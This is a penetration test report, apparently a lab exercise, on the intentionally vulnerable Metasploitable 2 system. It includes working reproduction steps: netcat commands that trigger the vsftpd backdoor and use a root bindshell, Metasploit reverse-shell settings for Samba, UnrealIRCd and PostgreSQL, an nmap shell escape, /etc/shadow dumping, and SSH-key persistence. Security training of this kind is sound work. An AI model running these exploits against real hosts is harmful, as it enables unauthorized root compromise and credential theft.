
# Penetration Test Report

## Metasploitable 2 Assessment

**Date:** May 2026  
**Tester:** [Your Name]  
**Environment:** Isolated VirtualBox Host-Only Lab  

---

## Executive Summary

A comprehensive penetration test was conducted against Metasploitable 2, an intentionally vulnerable Linux system. The assessment identified **10 critical vulnerabilities** allowing immediate root access. Full compromise was achieved via multiple independent attack paths.

**Key Finding:** An attacker with network access can gain complete control of the system in under 30 seconds using default credentials or unpatched backdoors.

**Risk Rating:** 🔴 CRITICAL

---

## Scope

| Item | Details |
|------|---------|
| Target IP | 192.168.56.101 |
| Services tested | All open ports (21,22,23,25,80,139,445,3306,5432,5900,6667,8180,1524) |
| Testing methodology | PTES (Penetration Testing Execution Standard) |

---

## Vulnerability Summary

| # | Vulnerability | CVE | CVSS | Affected Port | Root Access |
|---|---------------|-----|------|---------------|--------------|
| 1 | vsftpd 2.3.4 Backdoor | CVE-2011-2523 | 10.0 | 21 | ✅ |
| 2 | Samba Usermap Script | CVE-2007-2447 | 10.0 | 445 | ✅ |
| 3 | UnrealIRCd Backdoor | CVE-2010-2075 | 10.0 | 6667 | ✅ |
| 4 | Open Root Bindshell | N/A | 10.0 | 1524 | ✅ |
| 5 | PostgreSQL RCE | CVE-2007-3278 | 9.0 | 5432 | ✅ |
| 6 | VNC Default Password | N/A | 9.8 | 5900 | ✅ |
| 7 | Tomcat Manager RCE | CVE-2009-3843 | 9.3 | 8180 | ✅ |
| 8 | MySQL Default Creds | CVE-2012-2122 | 8.8 | 3306 | ❌ (DB only) |
| 9 | Distcc RCE | CVE-2002-2095 | 9.0 | 3632 | ✅ |
| 10 | Telnet Brute Force | N/A | 7.5 | 23 | ✅ (with brute force) |

---

## Detailed Findings

### Finding 1: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

| Field | Details |
|-------|---------|
| **CVSS Score** | 10.0 (Critical) |
| **Affected Port** | 21/TCP (FTP) |
| **Access Gained** | root (uid=0) |
| **MITRE Tactic** | TA0001 - Initial Access / T1190 |

**Description:** vsftpd version 2.3.4 contains a malicious backdoor inserted into the source code. Sending a username containing ":)" opens a root shell on port 6200.

**Steps to Reproduce:**
```bash
nc 192.168.56.101 21
USER root:)
PASS test
nc 192.168.56.101 6200
whoami Output: root
Remediation: Upgrade vsftpd to 3.0.5+ or disable FTP service.

Finding 2: Samba Usermap Script (CVE-2007-2447)
Field	Details
CVSS Score	10.0 (Critical)
Affected Port	445/TCP (SMB)
Access Gained	root
Description: Samba 3.0.20 allows command injection via the username field in the usermap script.
```
## Steps to Reproduce (Metasploit):

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set PAYLOAD cmd/unix/reverse_netcat
exploit
Remediation: Update Samba to version 3.0.25 or later.

Finding 3: UnrealIRCd Backdoor (CVE-2010-2075)
Field	Details
CVSS Score	10.0 (Critical)
Affected Port	6667/TCP (IRC)
Access Gained	root
Description: UnrealIRCd 3.2.8.1 contains a backdoor that allows remote command execution.
```
## Steps to Reproduce (Metasploit):

```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set PAYLOAD cmd/unix/reverse
exploit
Remediation: Upgrade UnrealIRCd to a patched version or disable IRC service.

Finding 4: Open Root Bindshell (Port 1524)
Field	Details
CVSS Score	10.0 (Critical)
Affected Port	1524/TCP
Access Gained	root (immediate)
Description: A root bindshell is listening on port 1524 with no authentication.
```
## Steps to Reproduce:

```bash
nc 192.168.56.101 1524
whoami   # Output: root
Remediation: Immediately stop and remove the ingresslock service. Block port 1524 at firewall.

Finding 5: PostgreSQL RCE (CVE-2007-3278)
Field	Details
CVSS Score	9.0 (Critical)
Affected Port	5432/TCP (PostgreSQL)
Access Gained	postgres user → root via SUID nmap
Description: PostgreSQL 8.3 allows unauthenticated command execution via user-defined functions.
```
## Steps to Reproduce:

```bash
msfconsole
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.56.101
set USERNAME postgres
set PASSWORD postgres
set LHOST 192.168.56.102
exploit
# Then escalate with SUID nmap:
nmap --interactive
nmap> !sh
Remediation: Upgrade PostgreSQL, remove default credentials, and remove SUID bit from nmap.
```

## Post-Exploitation Activities
### After gaining root access, the following actions were performed:
```bash
User enumeration: cat /etc/passwd, cat /etc/shadow

Network mapping: ifconfig, route -n, netstat -tulpn

Process enumeration: ps auxf

SUID binaries found: nmap, passwd, sudo, ping

Persistence established: SSH key backdoor added

Data exfiltration simulated: Passwords and configuration files copied
```
## MITRE ATT&CK Mapping
```bash
Tactic	ATT&CK ID	Technique	Demonstrated
Initial Access	T1190	Exploit Public-Facing App	vsftpd, Samba, UnrealIRCd
Execution	T1059	Command & Scripting Interpreter	Reverse shells
Persistence	T1136	Create Account	Backdoor user
Privilege Escalation	T1068	Exploitation for Priv Esc	SUID nmap
Credential Access	T1003	OS Credential Dumping	/etc/shadow extraction
Discovery	T1083	File & Directory Discovery	System enumeration
Exfiltration	T1041	Exfiltration Over C2	Netcat transfer
Remediation Recommendations (Priority Order)
Priority	Action	Rationale
🔴 Immediate	Remove port 1524 bindshell	Direct root access, no authentication
🔴 Immediate	Change all default credentials	msfadmin, postgres, tomcat, mysql, VNC
🔴 High	Patch vsftpd, Samba, UnrealIRCd	Backdoors allow RCE
🟠 High	Upgrade PostgreSQL, distcc	RCE vulnerabilities
🟡 Medium	Disable unused services	Reduce attack surface (telnet, VNC if not needed)
🟢 Low	Implement host-based firewall	Limit access to authorized IPs
```
## Conclusion
```bash
Metasploitable 2 is critically vulnerable to multiple remote root exploits. The system should never be exposed to any untrusted network. All findings would be eliminated by:

Regular patching

Removing default credentials

Disabling unnecessary services

Implementing network segmentation
```
# Assessment completed: June 03 2026
# Prepared by: Gokul G